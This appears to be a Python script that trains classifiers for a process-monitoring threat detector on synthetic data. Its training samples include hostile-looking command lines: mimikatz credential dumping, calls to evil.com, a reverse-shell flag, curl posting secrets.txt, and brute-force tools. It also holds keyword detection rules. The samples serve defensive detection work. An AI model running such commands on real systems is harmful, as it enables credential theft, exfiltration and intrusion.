#!/usr/bin/env python3
"""
Train models inside Docker container to ensure version compatibility.
Run with: docker exec fortifai-ml python /app/train_in_container.py
"""
import os
import json
import random
import pandas as pd
import numpy as np
from sklearn.ensemble import RandomForestClassifier, GradientBoostingClassifier
from sklearn.model_selection import train_test_split
from sklearn.preprocessing import LabelEncoder, StandardScaler
from sklearn.metrics import classification_report
import joblib
from datetime import datetime

OUTPUT_DIR = '/app/models/trained'

# Training data generator
class TrainingDataGenerator:
    def __init__(self):
        self.normal_processes = [
            {'name': 'System', 'cpu': (0, 5), 'mem': (0, 0.5)},
            {'name': 'svchost.exe', 'cpu': (0, 15), 'mem': (0.1, 3)},
            {'name': 'chrome.exe', 'cpu': (0, 70), 'mem': (2, 30)},
            {'name': 'firefox.exe', 'cpu': (0, 60), 'mem': (2, 25)},
            {'name': 'Code.exe', 'cpu': (0, 50), 'mem': (2, 18)},
            {'name': 'python.exe', 'cpu': (0, 100), 'mem': (0.5, 30)},
            {'name': 'node.exe', 'cpu': (0, 100), 'mem': (1, 25)},
            {'name': 'java.exe', 'cpu': (0, 100), 'mem': (5, 35)},
            {'name': 'docker.exe', 'cpu': (0, 50), 'mem': (1, 10)},
            {'name': 'bash.exe', 'cpu': (0, 60), 'mem': (0.5, 5)},
            {'name': 'powershell.exe', 'cpu': (0, 60), 'mem': (1, 12)},
            {'name': 'npm.exe', 'cpu': (0, 100), 'mem': (1, 18)},
            {'name': 'git.exe', 'cpu': (0, 50), 'mem': (0.5, 5)},
            {'name': 'explorer.exe', 'cpu': (0, 10), 'mem': (1, 5)},
            {'name': 'Teams.exe', 'cpu': (0, 35), 'mem': (3, 20)},
        ]
        
        self.malicious_patterns = {
            'malware': [
                {'name': 'mimikatz.exe', 'cmd': 'mimikatz.exe sekurlsa::logonpasswords'},
                {'name': 'svchosts.exe', 'cmd': 'svchosts.exe -connect evil.com'},
                {'name': 'payload.exe', 'cmd': 'payload.exe --silent'},
            ],
            'ransomware': [
                {'name': 'encrypt.exe', 'cmd': 'encrypt.exe --recursive'},
                {'name': 'locker.exe', 'cmd': 'locker.exe --wallet bc1q'},
                {'name': 'cryptor.exe', 'cmd': 'cryptor.exe -aes256'},
            ],
            'trojan': [
                {'name': 'svchost.exe', 'cmd': 'svchost.exe -connect 185.141.62.123'},
                {'name': 'update.exe', 'cmd': 'update.exe --download http://evil.com'},
                {'name': 'helper.exe', 'cmd': 'helper.exe --reverse-shell'},
            ],
            'ddos': [
                {'name': 'stress.exe', 'cmd': 'stress.exe --flood'},
                {'name': 'hping.exe', 'cmd': 'hping.exe --flood target.com'},
            ],
            'brute_force': [
                {'name': 'hydra.exe', 'cmd': 'hydra.exe -l admin -P wordlist.txt'},
                {'name': 'john.exe', 'cmd': 'john.exe --wordlist=rockyou.txt'},
            ],
            'data_exfiltration': [
                {'name': 'rclone.exe', 'cmd': 'rclone.exe copy C:\\Confidential'},
                {'name': 'curl.exe', 'cmd': 'curl.exe -X POST -d @secrets.txt'},
            ],
            'privilege_escalation': [
                {'name': 'winpeas.exe', 'cmd': 'winpeas.exe'},
                {'name': 'powershell.exe', 'cmd': 'powershell.exe -encodedcommand JABj'},
                {'name': 'psexec.exe', 'cmd': 'psexec.exe \\\\target -s cmd.exe'},
            ],
        }
    
    def generate_normal(self):
        proc = random.choice(self.normal_processes)
        return {
            'process_name': proc['name'],
            'cmdline': proc['name'],
            'cpu_usage': random.uniform(*proc['cpu']),
            'memory_usage': random.uniform(*proc['mem']),
            'has_network': random.choice([0, 0, 0, 1]),
            'connections': random.randint(0, 15),
            'label': 'normal'
        }
    
    def generate_malicious(self, threat_type):
        pattern = random.choice(self.malicious_patterns[threat_type])
        return {
            'process_name': pattern['name'],
            'cmdline': pattern['cmd'],
            'cpu_usage': random.uniform(20, 90),
            'memory_usage': random.uniform(5, 30),
            'has_network': 1 if threat_type in ['ddos', 'trojan', 'brute_force'] else 0,
            'connections': random.randint(10, 200) if threat_type == 'ddos' else random.randint(0, 20),
            'label': threat_type
        }
    
    def generate_dataset(self, n=15000):
        samples = []
        n_normal = int(n * 0.7)
        n_per_threat = (n - n_normal) // 7
        
        for _ in range(n_normal):
            samples.append(self.generate_normal())
        for threat in self.malicious_patterns:
            for _ in range(n_per_threat):
                samples.append(self.generate_malicious(threat))
        
        random.shuffle(samples)
        return pd.DataFrame(samples)


def extract_features(row):
    name = str(row.get('process_name', '')).lower()
    cmd = str(row.get('cmdline', '')).lower()
    
    return {
        'cpu_usage': float(row.get('cpu_usage', 0)),
        'memory_usage': float(row.get('memory_usage', 0)),
        'name_length': len(name),
        'cmd_length': len(cmd),
        'has_args': 1 if ' ' in cmd else 0,
        'has_network': int(row.get('has_network', 0)),
        'connections': int(row.get('connections', 0)),
        'encoded_cmd': 1 if 'encodedcommand' in cmd or '-enc' in cmd else 0,
        'download_cmd': 1 if 'download' in cmd else 0,
        'connect_cmd': 1 if 'connect' in cmd or 'reverse' in cmd else 0,
        'encrypt_cmd': 1 if 'encrypt' in cmd else 0,
        'is_mimikatz': 1 if 'mimikatz' in name or 'sekurlsa' in cmd else 0,
        'is_psexec': 1 if 'psexec' in name else 0,
        'has_typo': 1 if name in ['svchosts.exe', 'scvhost.exe'] else 0,
    }


def main():
    print("="*60)
    print("TRAINING ML MODELS IN CONTAINER")
    print("="*60)
    
    # Generate data
    gen = TrainingDataGenerator()
    df = gen.generate_dataset(15000)
    print(f"\n✓ Generated {len(df)} samples")
    print(f"  Normal: {len(df[df['label']=='normal'])}")
    
    # Extract features
    features = [extract_features(row) for _, row in df.iterrows()]
    X = pd.DataFrame(features)
    
    le = LabelEncoder()
    y = le.fit_transform(df['label'])
    
    scaler = StandardScaler()
    X_scaled = scaler.fit_transform(X)
    
    X_train, X_test, y_train, y_test = train_test_split(X_scaled, y, test_size=0.2, stratify=y)
    
    # Train RF
    print("\nTraining Random Forest...")
    rf = RandomForestClassifier(n_estimators=200, max_depth=15, class_weight='balanced', n_jobs=-1)
    rf.fit(X_train, y_train)
    print(f"  Accuracy: {rf.score(X_test, y_test):.4f}")
    
    # Train GB
    print("\nTraining Gradient Boosting...")
    gb = GradientBoostingClassifier(n_estimators=100, max_depth=8)
    gb.fit(X_train, y_train)
    print(f"  Accuracy: {gb.score(X_test, y_test):.4f}")
    
    # Report
    print("\n" + classification_report(y_test, rf.predict(X_test), target_names=le.classes_))
    
    # Save
    os.makedirs(OUTPUT_DIR, exist_ok=True)
    joblib.dump(rf, f'{OUTPUT_DIR}/rf_model.joblib')
    joblib.dump(gb, f'{OUTPUT_DIR}/gb_model.joblib')
    joblib.dump(scaler, f'{OUTPUT_DIR}/scaler.joblib')
    joblib.dump(le, f'{OUTPUT_DIR}/label_encoder.joblib')
    
    with open(f'{OUTPUT_DIR}/feature_columns.json', 'w') as f:
        json.dump(list(X.columns), f)
    
    metadata = {
        'trained_at': datetime.now().isoformat(),
        'samples': len(df),
        'rf_accuracy': float(rf.score(X_test, y_test)),
        'gb_accuracy': float(gb.score(X_test, y_test)),
        'classes': list(le.classes_)
    }
    with open(f'{OUTPUT_DIR}/model_metadata.json', 'w') as f:
        json.dump(metadata, f, indent=2)
    
    print(f"\n✓ Models saved to {OUTPUT_DIR}")
    print("\nRestart container to load models:")
    print("  docker-compose restart ml-engine")


if __name__ == '__main__':
    main()
